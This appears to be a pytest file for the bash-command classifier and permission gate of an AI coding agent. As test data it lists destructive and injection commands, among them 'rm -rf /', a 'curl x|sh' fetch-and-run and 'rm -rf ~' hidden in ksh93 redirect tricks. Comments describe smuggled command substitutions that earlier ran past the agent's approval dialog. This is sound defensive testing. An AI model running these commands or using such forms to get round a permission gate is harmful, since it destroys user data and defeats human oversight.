    [(c, Verdict.ASK) for c in _R2_QUOTE_ASK + _R2_COMMENT_ASK]
    + [(c, Verdict.DENY) for c in _R2_QUOTE_DENY + _R2_COMMENT_DENY]
    + [(c, Verdict.ALLOW) for c in _R2_COMMENT_ALLOW + _R2_STAYS_ALLOW],
)
def test_fix_round_2_reads_quotes_and_comments_as_the_shells_do(
    command: str, verdict: Verdict, dialect: Dialect
) -> None:
    assert classify(command, dialect=dialect) == verdict, command


@pytest.mark.parametrize("shell", ["bash", "zsh", "dash", "ksh", "mksh"])
@pytest.mark.parametrize(
    "command", ["cat <<E\n${x:-'$" + _BN + "(: > MARK)'}\nE", "echo \\ #$(: > MARK)"]
)
def test_every_shell_runs_the_round_2_form_and_it_asks(
    command: str, shell: str, tmp_path: Path
) -> None:
    path = _shell_or_skip(shell)
    assert _run_marked(path, command, tmp_path / "form"), f"{shell} did not run {command!r}"
    real = "echo hi #$(: > MARK)"
    assert not _run_marked(path, real, tmp_path / "comment"), f"{shell} ran {real!r}"
    assert classify(command) == Verdict.ASK, command


@pytest.mark.parametrize(
    ("source", "joined"),
    [
        (b"cat <<E\n${x:-'a\\\nb'}\nE", b"cat <<E\n${x:-'ab'}\nE"),
        (b"echo \"${x:-'a\\\nb'}\"", b"echo \"${x:-'ab'}\""),
        (b"echo \"${x:-$'a\\\nb'}\"", b"echo \"${x:-$'ab'}\""),
        (b"echo ${x:-'a\\\nb'}", b"echo ${x:-'a\\\nb'}"),
        (b"echo \"$(echo 'a\\\nb')\"", b"echo \"$(echo 'a\\\nb')\""),
        (b"echo \\ #a\\\nb", b"echo \\ #ab"),
        (b"echo 'a'\\\nb", b"echo 'a'b"),
        # all nine shells end this here-document on the line ``\`` and run
        # the line after it
        (b"cat <<\\\\\nx\n\\\necho hi", b"cat <<\\\\\nx\n\\\necho hi"),
    ],
)
def test_which_quotes_and_comments_keep_a_continuation(source: bytes, joined: bytes) -> None:
    assert bc._PARSER is not None
    root = bc._PARSER.parse(source).root_node
    assert bc._joined_lines(root, source) == joined


def test_a_here_document_ending_on_a_lone_backslash_stays_allow() -> None:
    assert classify("cat <<\\\\\nx\n\\\necho hi") == Verdict.ALLOW


# The ``.sh`` namespace pattern decides these: ALLOW on 71f837eb, and ALLOW
# again with the pattern taken out of a copy of this round's code.
@pytest.mark.parametrize(
    "command", ["[[ -t .sh.match ]]", "[ -t .sh.match ]", "[[ -t 0+.sh.match ]]"]
)
def test_a_ksh_namespace_test_operand_asks(command: str) -> None:
    assert classify(command) == Verdict.ASK, command


# A command tree-sitter rejects is also read joined: DENY when that reading
# is, ASK at least (each was ASK on eb98b93b).
@pytest.mark.parametrize(
    ("command", "verdict"),
    [
        ("rm -rf / 2>" + _BN + "&1", Verdict.DENY),
        ("cat <" + _BN + "(curl x|sh)", Verdict.DENY),
        ("ls 2>" + _BN + "&1", Verdict.ASK),
        ("echo $(", Verdict.ASK),
    ],
)
def test_a_rejected_command_takes_its_joined_reading(command: str, verdict: Verdict) -> None:
    assert classify(command) == verdict, command


class _CountedRanges(list[tuple[int, int]]):
    """The kept ranges, counting each read of one; a scan of the whole list fails."""

    def __init__(self, ranges: list[tuple[int, int]]) -> None:
        super().__init__(ranges)
        self.reads = 0

    def __getitem__(self, index: Any) -> Any:
        self.reads += 1
        return super().__getitem__(index)

    def __iter__(self) -> Any:
        raise AssertionError("every kept range scanned")


def test_the_kept_ranges_are_walked_once(monkeypatch: pytest.MonkeyPatch) -> None:
    """Not a scan of every range per continuation: on eb98b93b ``echo`` and 20,000 ``'a\\⏎b'`` took 3.98 s."""

    source = ("echo " + " ".join(["'a" + _BN + "b'"] * 20000)).encode()
    assert bc._PARSER is not None
    root = bc._PARSER.parse(source).root_node
    kept = bc._kept_text(root, source)
    assert len(kept) == 20000
    counted = _CountedRanges(kept)
    monkeypatch.setattr(bc, "_kept_text", lambda _root, _source: counted)
    assert bc._joined_lines(root, source) == source
    assert 0 < counted.reads <= 3 * 20000


# --- The entry points that act on the verdict ---------------------------------


class _Ctx:
    def __init__(self, *, has_ui: bool) -> None:
        self.has_ui = has_ui
        self.ui: Any = _Ui() if has_ui else None
        self.cwd = "/proj"


class _Ui:
    """Records whether the bash prompt was shown; answers No."""

    def __init__(self) -> None:
        self.select_calls = 0

    async def select(self, title: str, options: list[str], opts: Any = None) -> str | None:
        self.select_calls += 1
        return "No"

    async def input(self, *a: Any, **k: Any) -> str | None:
        return None


def _event(command: str) -> ToolCallHookEvent:
    return ToolCallHookEvent(
        tool_call_id="t1", tool_name="bash", args={"command": command}, context=BUILTIN_CONTEXT
    )


def _pin_shell(monkeypatch: pytest.MonkeyPatch, path: str) -> None:
    """Pin what ``_resolve_shell`` reports; windows-latest has no ``$SHELL`` (#688)."""

    monkeypatch.setattr(bash_module, "_resolve_shell", lambda *_a, **_k: ShellConfig(path, "-c"))


# The first four ran with no dialog and created PWNED in a pty TUI under
# ``auto`` on 71f837eb (``SHELL=/bin/zsh`` for the quoted one, ``/bin/bash``
# for the rest; ``.omc/probes/762/impl/``); the fifth did on 09d5a5b3 with
# ``/bin/bash`` (#742/#743 fix round 1), and the sixth on 71f837eb with
# ``/bin/bash`` (#762 fix round 1, ``.omc/probes/762/fix-r1/live/``); the
# last two did on 71f837eb and eb98b93b with ``/bin/bash`` and ``/bin/zsh``
# (fix round 2, ``.omc/probes/762/fix-r2/live/``). The ninth did on 71f837eb
# and b0039212 with ``/bin/ksh`` (the round-3 verify,
# ``.omc/probes/762/verify-r3/live/``, and #762 finish on b0039212,
# ``.omc/probes/762/finish/live/``).
_GATE_ASK = (
    "ls files/* >/dev/null; echo $((_))",
    "echo $(( '$(touch PWNED)' ))",
    f"[[ {_P} =~ .* ]] && echo $((BASH_REMATCH))",
    "ls files/* >/dev/null; echo ${PATH:_}",
    f"echo {_P}; (( _ ))",
    f"ls files/* >/dev/null; echo $({_BN}(echo -_))",
    "cat <<E\n${x:-'$" + _BN + "(: > MARK)'}\nE",
    "echo \\ #$(: > MARK)",
    "cat <#$(: > MARK)\n/dev/null",
)
_GATE_READS = (
    "echo $((i+1))",
    "echo ${a[i]}",
    "echo $((RANDOM % 6))",
    f"ls -la {_BN}  src/",
    "echo $(( ${#PWD} + 1 ))",
)


@pytest.mark.parametrize("shell", ["/bin/bash", "/bin/zsh", "/bin/ksh"])
async def test_auto_interactive_asks(shell: str, monkeypatch: pytest.MonkeyPatch) -> None:
    _pin_shell(monkeypatch, shell)
    perm = PermissionExtension(posture=PermissionPosture(mode=PermissionMode.AUTO))
    for command in _GATE_ASK:
        ctx = _Ctx(has_ui=True)
        result = await perm._on_tool_call(_event(command), ctx)  # type: ignore[arg-type]
        assert ctx.ui.select_calls == 1, command
        assert isinstance(result, ToolCallResult) and result.block, command  # the UI said No
    for command in _GATE_READS:
        ctx = _Ctx(has_ui=True)
        assert await perm._on_tool_call(_event(command), ctx) is None, command  # type: ignore[arg-type]
        assert ctx.ui.select_calls == 0, command


async def test_auto_headless_gates(monkeypatch: pytest.MonkeyPatch) -> None:
    """``headless_default="block"`` blocks the ASK; ``-p`` (``"allow"``) runs it, as every ASK.

    ``-p`` running an ASK is ADR-0120's rule and pre-existing (#740), so these
    forms still run there.
    """

    _pin_shell(monkeypatch, "/bin/bash")
    block = PermissionExtension(
        posture=PermissionPosture(mode=PermissionMode.AUTO), headless_default="block"
    )
    allow = PermissionExtension(posture=PermissionPosture(mode=PermissionMode.AUTO))
    ctx = _Ctx(has_ui=False)
    for command in _GATE_ASK:
        blocked = await block._on_tool_call(_event(command), ctx)  # type: ignore[arg-type]
        assert isinstance(blocked, ToolCallResult) and blocked.block, command
        assert await allow._on_tool_call(_event(command), ctx) is None, command  # type: ignore[arg-type]
    for command in _GATE_READS:
        assert await block._on_tool_call(_event(command), ctx) is None, command  # type: ignore[arg-type]


@pytest.mark.parametrize("shell", ["/bin/bash", "/bin/zsh", "/bin/ksh"])
def test_rpc_permissions_evaluate_matches_the_gate(
    shell: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    _pin_shell(monkeypatch, shell)
    for commands, expected in ((_GATE_ASK, "ask"), (_GATE_READS, "allow")):
        for command in commands:
            got = evaluate_tool_call(PermissionMode.AUTO, "bash", {"command": command}, "/proj")
            assert got == expected, command


def test_the_numeric_names_are_not_in_the_list() -> None:
    """The names left ALLOW above are absent from the list, under any spelling it matches."""

    for name in ("RANDOM", "SECONDS", "LINENO", "PPID", "OPTIND", "BASH_VERSINFO", "MATCH"):
        assert name not in bc._SHELL_FILLED_NAMES
        assert not name.startswith(bc._SHELL_FILLED_PREFIXES)


# --- #762 finish: a ``#`` right after ``<`` or ``>`` ---------------------------
#
# ksh93 reads ``<#`` and ``>#`` as operators (a seek), so a ``#`` right after
# ``<`` or ``>`` starts no comment there. Each ASK row and the first DENY row
# were ALLOW on 71f837eb and on b0039212. The ASK rows created MARK with
# ``files/z[$(: > MARK)]`` planted in macOS ksh93u+ and Linux ksh 93u+m, and
# in none of the other seven shells (``.omc/probes/762/finish/``). The DENY
# rows were only classified.
_FIN_KSH_ASK = (
    "cat <#$(: > MARK)\n/dev/null",
    "wc -l <#$(: > MARK)\n/dev/null",
    "cat 0<#$(: > MARK)\n/dev/null",
    "grep x <#$(: > MARK)\nfiles/r",
)
_FIN_KSH_DENY = (
    "cat <#$(rm -rf ~)\n/dev/null",
    # ASK on 71f837eb and b0039212; its ``$(: > MARK)`` twin, ASK on all
    # three, created MARK in both ksh93 builds and in no other shell
    "echo hi >#$(rm -rf ~)\nout.txt",
)
# The shells start these comments. None of the nine ran anything from them,
# with executables named ``#x`` and ``x`` that create MARK first on PATH.
# The last five keep the comment rule's ``at == 0``, ``&``, ``|``, ``(`` and
# newline: the round-3 verify's mutants M14, M19, M20 and M21 and this
# round's N6, which drop one each, turn them into ASK.
_FIN_ALLOW = (
    "cat < #x\n/dev/null",
    "echo hi >/dev/null # note",
    "ls -la  # list files",
    "# list files\nls -la",
    "echo hi &#x",
    "echo hi |#x\ncat",
    "(#x\nls)",
    "ls\n# list files\nls -la",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize(
    ("command", "verdict"),
    [(c, Verdict.ASK) for c in _FIN_KSH_ASK]
    + [(c, Verdict.DENY) for c in _FIN_KSH_DENY]
    + [(c, Verdict.ALLOW) for c in _FIN_ALLOW],
)
def test_a_hash_after_a_redirect_starts_no_comment(
    command: str, verdict: Verdict, dialect: Dialect
) -> None:
    assert classify(command, dialect=dialect) == verdict, command


def test_ksh93_runs_a_hash_after_a_redirect_and_it_asks(tmp_path: Path) -> None:
    ksh = _shell_or_skip("ksh")
    version = subprocess.run(
        [ksh, "-c", "echo ${.sh.version}"],
        env=_PATH_ENV,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    if version.returncode != 0 or "93" not in version.stdout:
        pytest.skip("ksh is not ksh93 (a ksh that is mksh has no <# operator)")
    command = _FIN_KSH_ASK[0]
    assert _run_marked(ksh, command, tmp_path / "form"), f"ksh93 did not run {command!r}"
    control = "cat < #$(: > MARK)\n/dev/null"
    assert not _run_marked(ksh, control, tmp_path / "control"), f"ksh93 ran {control!r}"
    assert classify(command) == Verdict.ASK, command
